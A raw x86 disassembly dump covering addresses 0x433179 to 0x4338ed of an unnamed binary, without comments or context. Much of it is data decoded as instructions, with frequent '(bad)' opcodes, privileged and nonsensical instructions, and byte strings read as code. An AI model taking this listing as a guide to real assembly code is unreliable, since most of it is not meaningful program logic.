  433179:	mov    eax,DWORD PTR [ebx]
  43317b:	nop
  43317c:	add    BYTE PTR [eax],al
  43317e:	inc    ebp
  43317f:	mov    esi,DWORD PTR [ebx]
  433181:	add    eax,DWORD PTR [ebx]
  433183:	cmp    al,0x89
  433185:	mov    esp,esi
  433187:	clc    
  433188:	inc    ebp
  433189:	inc    ebp
  43318a:	add    edx,DWORD PTR [esi+0xc]
  43318d:	mov    edi,0x7ff0845
  433192:	in     al,dx
  433193:	(bad)  
  433194:	jne    0x433131
  433196:	mov    esi,DWORD PTR [edx]
  433198:	clc    
  433199:	add    ebp,DWORD PTR [esi]
  43319b:	mov    edi,edi
  43319d:	in     al,dx
  43319e:	mov    DWORD PTR [ebp-0x10],eax
  4331a1:	xor    eax,DWORD PTR [ebp+0x3]
  4331a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4331b0:	lea    ecx,[ecx+0x45e8d4bc]
  4331b6:	clc    
  4331b7:	mov    edi,edi
  4331b9:	cmp    BYTE PTR [ebp+0x4d],al
  4331bc:	test   DWORD PTR [eax+0x74],ecx
  4331bf:	inc    ecx
  4331c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331c6:	ret    
  4331c7:	inc    eax
  4331c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331ce:	push   eax
  4331cf:	dec    eax
  4331d0:	test   al,0xd0
  4331d2:	dec    eax
  4331d4:	mov    eax,DWORD PTR [ebp-0x14]
  4331d7:	mov    eax,DWORD PTR [ebp+0x38]
  4331da:	mov    eax,ecx
  4331dc:	fadd   DWORD PTR [ebx]
  4331de:	dec    ebp
  4331df:	inc    eax
  4331e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331e6:	inc    ebp
  4331e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4331ed:	fadd   QWORD PTR [ebx]
  4331ef:	inc    ebp
  4331f0:	or     al,0x33
  4331f2:	dec    ebp
  4331f3:	add    edi,DWORD PTR [ebx]
  4331f5:	mov    DWORD PTR [edx-0x28],esi
  4331f8:	mov    eax,DWORD PTR [ebp-0x10]
  4331fb:	mov    eax,DWORD PTR [eax+0x10]
  4331fe:	mov    eax,edi
  433200:	lock ret 
  433202:	inc    ecx
  433203:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433209:	fsubr  st,st(5)
  43320b:	test   DWORD PTR [eax],eax
  43320d:	clc    
  43320e:	push   0x45
  433210:	(bad)  
  433211:	cmp    al,0xec
  433213:	pushf  
  433214:	inc    ebp
  433215:	(bad)  
  433216:	push   eax
  433217:	fsub   DWORD PTR [eax-0x7b]
  43321a:	(bad)  
  43321b:	clc    
  43321c:	mov    eax,0xf8008584
  433221:	mov    eax,DWORD PTR [ebp-0x4]
  433224:	mov    edi,0x4585c3cc
  43322a:	clc    
  43322b:	mov    eax,DWORD PTR [ebp+0x14]
  43322e:	xor    eax,DWORD PTR [ebp-0x64]
  433231:	mov    edi,eax
  433233:	in     al,dx
  433234:	les    esi,FWORD PTR [ebp-0x7b]
  433237:	mov    edi,eax
  433239:	or     al,0x4d
  43323b:	dec    ebp
  43323c:	mov    eax,ebp
  43323e:	in     al,0xf2
  433240:	dec    ebp
  433241:	dec    DWORD PTR [ecx+0x4dc7e045]
  433247:	fmul   DWORD PTR [ecx+0x4df8f085]
  43324d:	inc    ebp
  43324e:	mov    DWORD PTR [ebx],esi
  433250:	fadd   QWORD PTR [ebx]
  433252:	dec    ebp
  433253:	push   eax
  433254:	xor    eax,DWORD PTR [ebp+0x3]
  433257:	push   eax
  433258:	mov    DWORD PTR [eax+ebx*8],ebx
  43325b:	push   esi
  43325d:	mov    eax,DWORD PTR [eax]
  43325f:	lock cmp eax,0xf84e85c0
  433265:	inc    ebp
  433266:	test   BYTE PTR [ebx],dh
  433268:	add    DWORD PTR [ebx],eax
  43326a:	add    BYTE PTR [eax+0x4d],dl
  43326d:	jne    0x4332a2
  43326f:	lea    ecx,[ebx-0x7617fc44]
  433275:	div    ah
  433277:	inc    DWORD PTR [ebp+0x45]
  43327a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433280:	jb     0x43320d
  433282:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433289:	mov    ecx,DWORD PTR [ebp-0x10]
  43328c:	xor    ecx,DWORD PTR [ebp+0x3]
  43328f:	mov    edi,DWORD PTR [ebx]
  433291:	adc    BYTE PTR [ebp+0x41],dh
  433294:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43329a:	ret    
  43329b:	push   ss
  43329c:	push   0x45
  43329e:	lea    ecx,[ebx+0x4de80cb0]
  4332a4:	sti    
  4332a5:	add    edi,edi
  4332a7:	or     BYTE PTR [ebp+0x4d],al
  4332aa:	mov    ebp,DWORD PTR [ebx]
  4332ac:	xor    ebp,ecx
  4332ae:	mov    al,BYTE PTR [edx]
  4332b0:	add    eax,0xc7200
  4332b5:	jne    0x433304
  4332b7:	lea    esi,[ebx]
  4332b9:	mov    al,0xf
  4332bb:	call   0xf2980
  4332c0:	shl    DWORD PTR [ecx],0x84
  4332c3:	pushf  
  4332c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332ca:	mov    esi,DWORD PTR [edx]
  4332cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332d3:	test   DWORD PTR [eax],eax
  4332d5:	clc    
  4332d6:	dec    ebp
  4332d7:	inc    ebp
  4332d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4332db:	pushf  
  4332dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332e3:	lea    eax,[ecx]
  4332e5:	int3   
  4332e6:	add    BYTE PTR [ebp+0x45],cl
  4332e9:	lea    ecx,[ebx-0x75b2cc38]
  4332ef:	lea    eax,ds:0x4d72c4
  4332f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4332f8:	xor    ecx,edi
  4332fa:	bswap  ebx
  4332fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433300:	rol    DWORD PTR [ecx],0x84
  433303:	add    BYTE PTR [ecx],al
  433305:	xor    eax,DWORD PTR [eax]
  433307:	pushf  
  433308:	inc    ebp
  433309:	jnp    0x8a43670c
  43330f:	mov    eax,DWORD PTR ds:0xcf72e8
  433315:	lock dec ebp
  433317:	retf   
  433318:	xor    ecx,DWORD PTR [ebp+0xf]
  43331b:	mov    eax,eax
  43331d:	fmul   st,st(3)
  43331f:	test   ecx,0x19b8484
  433325:	xor    al,BYTE PTR [eax]
  433327:	mov    DWORD PTR [ebp-0x28],eax
  43332a:	mov    eax,DWORD PTR [ebp+0x33]
  43332d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433333:	ret    
  433334:	add    al,cl
  433336:	dec    ebp
  433337:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43333d:	add    ecx,DWORD PTR ds:0xc7250
  433343:	inc    ebp
  433344:	rcl    DWORD PTR [eax+0x4d],0x2b
  433348:	mov    edi,edi
  43334a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433350:	jb     0x433319
  433352:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433359:	mov    esi,DWORD PTR [ebx]
  43335b:	cld    
  43335c:	mov    cl,bh
  43335e:	or     eax,0x372b6
  433363:	cmp    ecx,eax
  433365:	jne    0x4333e2
  43336b:	mov    eax,DWORD PTR [ebp-0x20]
  43336e:	mov    eax,DWORD PTR [eax]
  433370:	xor    eax,edi
  433372:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433379:	mov    ecx,DWORD PTR [ebp-0x4]
  43337c:	mov    ecx,edi
  43337e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433384:	jb     0x433395
  433386:	add    BYTE PTR [edi-0x3f],dl
  433389:	add    BYTE PTR [ebp-0x75],cl
  43338c:	mov    esi,eax
  43338e:	xor    eax,DWORD PTR [eax]
  433390:	mov    al,bh
  433392:	or     eax,0x4b7284
  433397:	xor    al,cl
  433399:	mov    ecx,DWORD PTR [ebp-0x4]
  43339c:	mov    ecx,edi
  43339e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333a4:	jb     0x4333b5
  4333a6:	add    BYTE PTR [edi],dh
  4333a8:	enter  0x8500,0x8b
  4333ac:	add    ah,bl
  4333ae:	add    BYTE PTR [eax],al
  4333b0:	inc    ebp
  4333b1:	(bad)  
  4333b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333b9:	mov    esi,DWORD PTR [edx-0x4]
  4333bc:	add    bh,cl
  4333be:	dec    ebp
  4333bf:	mov    dh,0x8b
  4333c1:	add    esi,DWORD PTR [ebx]
  4333c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333c9:	add    BYTE PTR [eax],al
  4333cb:	mov    eax,ecx
  4333cd:	loopne 0x43341c
  4333cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333d5:	dec    ebx
  4333d6:	or     eax,0x8b7232
  4333db:	in     al,0xc1
  4333dd:	or     DWORD PTR [ebp-0x31],ecx
  4333e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333e7:	xor    dh,BYTE PTR [edx-0x75]
  4333ea:	add    al,dh
  4333ec:	enter  0x4f09,0xcf
  4333f0:	inc    ebp
  4333f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4333f7:	or     al,BYTE PTR ds:0xe4728b
  4333fd:	or     DWORD PTR [ebp-0x31],ecx
  433400:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433407:	cmp    dh,BYTE PTR [edx+0xf]
  43340a:	add    bl,dl
  43340c:	rol    DWORD PTR [eax],0x4d
  43340f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433415:	(bad)  
  433416:	or     eax,0x4b7284
  43341b:	xor    al,cl
  43341d:	mov    ecx,DWORD PTR [ebp-0x20]
  433420:	mov    ecx,DWORD PTR [ecx]
  433422:	xor    ecx,edi
  433424:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43342b:	xor    cl,al
  43342d:	mov    ecx,DWORD PTR [edi]
  43342f:	fadd   QWORD PTR [ebp+0x9]
  433432:	call   0xffd02f06
  433437:	dec    ebx
  433438:	dec    ebp
  433439:	xor    bh,BYTE PTR [ebx]
  43343b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43343f:	loopne 0x43343d
  433441:	or     edi,eax
  433443:	iret   
  433444:	ret    
  433445:	mov    WORD PTR [ebp+0x4f],es
  433448:	mov    esi,DWORD PTR [edx]
  43344a:	call   0x8452fb89
  43344f:	(bad)  
  433450:	fwait
  433451:	add    BYTE PTR [edx],dh
  433453:	mov    esi,DWORD PTR [ebx]
  433455:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43345b:	test   BYTE PTR [ebx],dh
  43345d:	dec    ebx
  43345e:	add    esi,DWORD PTR [edx]
  433460:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433466:	dec    edi
  433468:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43346f:	xor    al,BYTE PTR [ebx]
  433471:	mov    edi,DWORD PTR [ebx]
  433473:	in     al,0x75
  433475:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43347b:	dec    ebx
  43347c:	xor    esi,DWORD PTR [edx]
  43347e:	lea    ecx,[edx]
  433480:	or     BYTE PTR [ebx+0x900f072],cl
  433486:	ja     0x433457
  433488:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43348f:	cmp    ch,al
  433491:	jne    0x433486
  433493:	mov    edi,edi
  433495:	fadd   QWORD PTR [ebp+0x0]
  433498:	mov    eax,edi
  43349a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334a1:	mov    edx,DWORD PTR [ebx]
  4334a3:	in     al,0x45
  4334a5:	or     DWORD PTR [ebx],esi
  4334a7:	iret   
  4334a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334af:	xor    dl,BYTE PTR [eax-0x75]
  4334b2:	sbb    al,0xe0
  4334b4:	dec    DWORD PTR [ecx]
  4334b6:	mov    ecx,edi
  4334b8:	in     al,dx
  4334b9:	mov    eax,es
  4334bb:	dec    ebx
  4334bc:	mov    DWORD PTR [edx],esi
  4334be:	fmul   QWORD PTR [edx]
  4334c0:	jne    0x43344d
  4334c2:	(bad)  
  4334c3:	(bad)  
  4334c5:	or     DWORD PTR [ebp-0x31],eax
  4334c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334cf:	cmp    bh,bh
  4334d1:	jne    0x433518
  4334d3:	lea    ecx,[ebx-0x38372750]
  4334d9:	inc    ebx
  4334db:	mov    eax,ecx
  4334dd:	mov    eax,0xa00c111
  4334e2:	jne    0x433529
  4334e4:	mov    esi,DWORD PTR [ebx]
  4334e6:	test   al,0x3
  4334e8:	inc    ebp
  4334e9:	mov    DWORD PTR [eax-0xc],edx
  4334ec:	loop   0x433533
  4334ee:	push   DWORD PTR [ebx]
  4334f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4334f6:	add    DWORD PTR [eax],eax
  4334f8:	mov    eax,edi
  4334fa:	lods   al,BYTE PTR ds:[esi]
  4334fb:	dec    ebp
  4334fc:	inc    ebp
  4334fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433503:	retf   
  433504:	mov    edx,ecx
  433506:	adc    al,0x84
  433508:	(bad)  
  433509:	std    
  43350a:	ret    
  43350b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433511:	hlt    
  433512:	rol    edi,0x82
  433515:	ret    
  433516:	cld    
  433517:	enter  0x11ff,0x45
  43351b:	inc    ebp
  43351c:	pop    edi
  43351d:	mov    ebx,DWORD PTR [ebx+0x14]
  433520:	ret    0xc7
  433523:	test   BYTE PTR [ebx+0x4532519b],cl
  433529:	jmp    0x4334b6
  43352b:	push   0x8
  43352d:	call   DWORD PTR [esi]
  43352f:	in     al,dx
  433530:	add    BYTE PTR [ebp+0x1],0x50
  433534:	add    bh,ah
  433536:	add    bh,bh
  433538:	icebp  
  433539:	mov    ecx,DWORD PTR [eax]
  43353b:	cld    
  43353c:	pop    es
  43353d:	dec    ebp
  43353e:	shl    DWORD PTR [ebx],0x72
  433541:	add    eax,DWORD PTR [eax]
  433543:	cmp    edx,ecx
  433545:	je     0x433557
  433547:	mov    esi,DWORD PTR [ebp-0x4]
  43354a:	inc    edi
  43354c:	or     al,0xc3
  43354e:	jmp    FWORD PTR [edx-0x18]
  433551:	(bad)  
  433552:	sti    
  433553:	cwde   
  433554:	(bad)  
  433555:	call   0xffa12e60
  43355a:	or     al,0x45
  43355c:	push   ebp
  43355d:	sub    esp,0x18
  433560:	push   ebx
  433561:	inc    ebp
  433562:	mov    edi,edi
  433564:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43356b:	test   al,0x54
  43356d:	inc    ebp
  43356e:	push   ecx
  43356f:	push   eax
  433570:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433576:	add    ah,bh
  433578:	(bad)  
  433579:	dec    ebp
  43357a:	add    DWORD PTR [ebx],esi
  43357c:	inc    ebp
  43357d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433583:	push   0xffffff8b
  433585:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43358b:	add    eax,DWORD PTR [ecx]
  43358d:	or     BYTE PTR [eax],al
  43358f:	call   0xff852d94
  433594:	mov    eax,DWORD PTR [ebp+0x14]
  433597:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43359d:	inc    ebp
  43359e:	dec    ecx
  43359f:	add    ebp,DWORD PTR [edx+0x14]
  4335a2:	push   0x8b3045
  4335a7:	call   0x33ad831c
  4335ac:	inc    DWORD PTR [ebx]
  4335ae:	mov    DWORD PTR [edi],ecx
  4335b0:	mov    eax,ecx
  4335b2:	or     BYTE PTR [ebp-0x3d],cl
  4335b5:	cmp    eax,edi
  4335b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335c2:	adc    al,0xc9
  4335c4:	inc    ebp
  4335c5:	adc    BYTE PTR [eax+0x55],dl
  4335c8:	jne    0x4335b6
  4335ca:	call   0xff54355a
  4335cf:	dec    ebp
  4335d0:	inc    ebp
  4335d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335d7:	add    BYTE PTR [ebx],bh
  4335d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335dd:	push   esp
  4335de:	or     al,0x51
  4335e0:	dec    ebp
  4335e1:	xor    DWORD PTR [ebx],0xf32039b
  4335e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4335ea:	mov    edi,edi
  4335ec:	pop    edi
  4335ed:	adc    BYTE PTR [ebx+0x75],bl
  4335f0:	ret    0x50
  4335f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4335f7:	(bad)  
  4335f8:	clc    
  4335f9:	mov    esp,ebp
  4335fb:	pop    ecx
  4335fc:	mov    ecx,0xf80085c2
  433601:	mov    ecx,DWORD PTR [ecx+edx*2]
  433604:	push   esi
  433605:	push   esi
  433606:	(bad)  
  433607:	lock add DWORD PTR [ebp+0x44],eax
  43360b:	mov    edx,DWORD PTR [eax]
  43360d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433611:	or     BYTE PTR [edi+eax*1+0x51],dl
  433615:	ret    
  433616:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43361c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433622:	or     al,0x80
  433624:	jge    0x433627
  433626:	mov    DWORD PTR [eax],eax
  433628:	and    al,0x8
  43362a:	cmp    DWORD PTR [ebp+0x10],eax
  43362d:	mov    edx,DWORD PTR [esi]
  43362f:	xchg   esp,eax
  433630:	dec    esp
  433631:	add    BYTE PTR [eax],dl
  433633:	mov    ecx,edx
  433635:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433639:	dec    ebp
  43363a:	into   
  43363b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433641:	mov    edx,DWORD PTR [eax+0x14]
  433644:	das    
  433645:	add    al,0x45
  433647:	add    BYTE PTR [ebp+0x0],dh
  43364a:	mov    edi,edi
  43364c:	and    al,0x50
  43364e:	mov    eax,DWORD PTR [eax]
  433650:	and    al,0xd1
  433652:	xor    eax,DWORD PTR [esi]
  433654:	lea    eax,[ebp+0x8]
  433657:	xor    esi,DWORD PTR [edx+0x3]
  43365a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433660:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433666:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433670:	cmp    al,0xff
  433672:	pushf  
  433673:	mov    edi,edi
  433675:	or     BYTE PTR [esi+ecx*1],cl
  433678:	jne    0x43363d
  43367a:	call   0xc3646
  43367f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433683:	mov    ebx,DWORD PTR [eax]
  433685:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433689:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433691:	pop    esi
  433692:	and    al,0xc9
  433694:	and    al,0x10
  433696:	call   DWORD PTR [ebp-0x73]
  433699:	in     al,dx
  43369a:	jmp    esp
  43369c:	je     0x433621
  43369e:	call   DWORD PTR [eax]
  4336a0:	and    al,0x31
  4336a2:	call   0xffcd3543
  4336a7:	and    al,0x44
  4336a9:	push   edi
  4336aa:	or     al,0x41
  4336ac:	pop    esi
  4336ad:	mov    ebp,esp
  4336af:	and    al,0xc2
  4336b1:	mov    eax,DWORD PTR [eax]
  4336b3:	and    al,0x85
  4336b5:	mov    edx,0x733080e
  4336ba:	jne    0x4336b6
  4336bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4336c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4336c8:	sbb    BYTE PTR [esp+edx*1],cl
  4336cb:	jl     0x4336cc
  4336cd:	adc    al,0x24
  4336cf:	dec    ebp
  4336d0:	mov    esi,DWORD PTR [ebp+0xc]
  4336d3:	mov    ecx,DWORD PTR [eax]
  4336d5:	and    al,0x39
  4336d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4336da:	or     BYTE PTR [eax+edx*1],ah
  4336dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4336e4:	clc    
  4336e5:	jmp    0x433683
  4336e7:	adc    al,bh
  4336e9:	inc    esp
  4336ea:	je     0x433738
  4336ec:	and    al,0xc2
  4336ee:	je     0x43368b
  4336f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4336f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4336fc:	sbb    al,0x10
  4336fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433702:	add    BYTE PTR [ebx+0xb],dh
  433705:	adc    BYTE PTR [eax],al
  433707:	mov    WORD PTR ds:0x3d450010,?
  43370d:	adc    BYTE PTR [eax],al
  43370f:	add    DWORD PTR [eax+edx*1],esp
  433712:	add    BYTE PTR [edx+0x6],cl
  433715:	adc    BYTE PTR [eax],al
  433717:	sub    dx,WORD PTR [eax]
  43371a:	add    bh,dl
  43371c:	imul   edx,DWORD PTR [eax],0x10302300
  433722:	add    BYTE PTR [esi-0x4ffef89],dl
  433728:	ss inc ebx
  43372a:	add    bh,bh
  43372c:	ss inc ebx
  43372e:	add    BYTE PTR [ebx],al
  433730:	aaa    
  433731:	inc    ebx
  433732:	add    BYTE PTR [edi],al
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [ebx],cl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [edi],cl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [eax+0x9001011],ah
  433758:	jo     0x43376a
  43375a:	add    BYTE PTR ds:0xd7001027,ch
  433760:	pop    eax
  433761:	adc    BYTE PTR [eax],al
  433763:	push   es
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [esi+0x33001031],ah
  43376c:	ins    BYTE PTR es:[edi],dx
  43376d:	adc    BYTE PTR [eax],al
  43376f:	jb     0x4337b0
  433771:	adc    BYTE PTR [eax],al
  433773:	push   ebx
  433774:	aaa    
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    dh,cl
  433794:	jge    0x4337a6
  433796:	add    BYTE PTR [esi-0x3dffef8e],dl
  43379c:	or     dl,BYTE PTR [eax]
  43379e:	add    dh,bl
  4337a0:	sub    dl,BYTE PTR [eax]
  4337a2:	add    BYTE PTR [edx],bl
  4337a4:	ins    BYTE PTR es:[edi],dx
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	addr16 jno 0x4337ba
  4337aa:	add    BYTE PTR [ebp+0x3d],ch
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	lds    esp,FWORD PTR [eax+0x10]
  4337b2:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337b8:	aaa    
  4337b9:	inc    ebx
  4337ba:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337c0:	aaa    
  4337c1:	inc    ebx
  4337c2:	add    BYTE PTR [ebx-0x58ffbcc9],ah
  4337c8:	aaa    
  4337c9:	inc    ebx
  4337ca:	add    BYTE PTR [ebx-0x50ffbcc9],ch
  4337d0:	aaa    
  4337d1:	inc    ebx
  4337d2:	add    BYTE PTR [esp+edx*1],bh
  4337d5:	adc    BYTE PTR [eax],al
  4337d7:	clc    
  4337d8:	cmp    dl,BYTE PTR [eax]
  4337da:	add    BYTE PTR [ecx],ah
  4337dc:	pop    ds
  4337dd:	adc    BYTE PTR [eax],al
  4337df:	mov    edi,0x6001073
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [ecx+0x34],bh
  4337e9:	adc    BYTE PTR [eax],al
  4337eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4337ef:	shl    DWORD PTR [edx+0x10],1
  4337f2:	add    bl,dl
  4337f4:	aaa    
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    BYTE PTR [ebp+0x14],al
  433815:	adc    BYTE PTR [eax],al
  433817:	fwait
  433818:	pop    ds
  433819:	adc    BYTE PTR [eax],al
  43381b:	jnp    0x433840
  43381d:	adc    BYTE PTR [eax],al
  43381f:	pop    esi
  433820:	adc    BYTE PTR cs:[eax],al
  433823:	popf   
  433824:	jno    0x433836
  433826:	add    ah,bl
  433828:	inc    ebp
  433829:	adc    BYTE PTR [eax],al
  43382b:	sbb    edx,DWORD PTR [edx+0x10]
  43382e:	add    BYTE PTR [edx+0x13001029],bl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	push   esp
  433854:	xor    al,0x4b
  433856:	aaa    
  433857:	pop    edi
  433858:	inc    edx
  433859:	dec    ebx
  43385a:	xor    DWORD PTR [ecx],edi
  43385c:	push   edi
  43385d:	add    BYTE PTR [ecx+0x39],cl
  433860:	xor    al,0x5f
  433862:	pop    ecx
  433863:	inc    edi
  433864:	push   edx
  433865:	pop    edi
  433866:	dec    edx
  433867:	xor    al,BYTE PTR [edx+0x30]
  43386a:	push   ebx
  43386b:	add    BYTE PTR [ecx+0x4a],cl
  43386e:	cmp    BYTE PTR [edi+0x38],bl
  433871:	xor    al,0x43
  433873:	xor    bl,BYTE PTR [eax+0x36]
  433876:	pop    edi
  433877:	inc    ebx
  433878:	add    BYTE PTR [edx+0x33],cl
  43387b:	dec    ebp
  43387c:	cmp    BYTE PTR [edi+0x53],bl
  43387f:	xor    DWORD PTR [eax],edi
  433881:	pop    edx
  433882:	pop    edi
  433883:	xor    BYTE PTR [edx+0x52],cl
  433886:	inc    ecx
  433887:	add    BYTE PTR [edx+0x42],al
  43388a:	inc    ebp
  43388b:	pop    edi
  43388c:	cmp    DWORD PTR [eax],edi
  43388e:	push   ebp
  43388f:	inc    edx
  433890:	xor    eax,0x5244505f
  433895:	xor    BYTE PTR [eax],al
  433897:	inc    edx
  433898:	inc    esp
  433899:	inc    edx
  43389a:	cmp    DWORD PTR [edi+0x52],ebx
  43389d:	dec    esp
  43389e:	inc    ebp
  43389f:	add    BYTE PTR [ebx+0x37],dl
  4338a2:	push   esp
  4338a3:	xor    BYTE PTR [edi+0x55],bl
  4338a6:	push   ebx
  4338a7:	aaa    
  4338a8:	dec    ebp
  4338a9:	pop    edi
  4338aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4338ad:	dec    ebx
  4338ae:	add    BYTE PTR [edx+0x47],cl
  4338b1:	inc    edi
  4338b2:	xor    eax,0x534e5f32
  4338b7:	push   esp
  4338b8:	pop    edi
  4338b9:	push   esp
  4338ba:	inc    edx
  4338bb:	add    BYTE PTR [ebx+0x4d],al
  4338be:	xor    BYTE PTR [edi+0x47],bl
  4338c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4338c4:	push   eax
  4338c5:	push   ecx
  4338c6:	push   ecx
  4338c7:	pop    edi
  4338c8:	inc    ebx
  4338c9:	push   edi
  4338ca:	push   esi
  4338cb:	add    BYTE PTR [ecx+0x57],cl
  4338ce:	inc    ebp
  4338cf:	pop    edi
  4338d0:	pop    ecx
  4338d1:	push   edx
  4338d2:	inc    edx
  4338d3:	pop    edi
  4338d4:	inc    edi
  4338d5:	add    BYTE PTR [ebx+0x51],dl
  4338d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4338de:	inc    edi
  4338df:	xor    edx,DWORD PTR [edx+0x34]
  4338e2:	pop    edi
  4338e3:	pop    edx
  4338e4:	cmp    BYTE PTR [eax],al
  4338e6:	inc    edi
  4338e7:	xor    esi,DWORD PTR ds:0x5451585f
  4338ed:	dec    esp
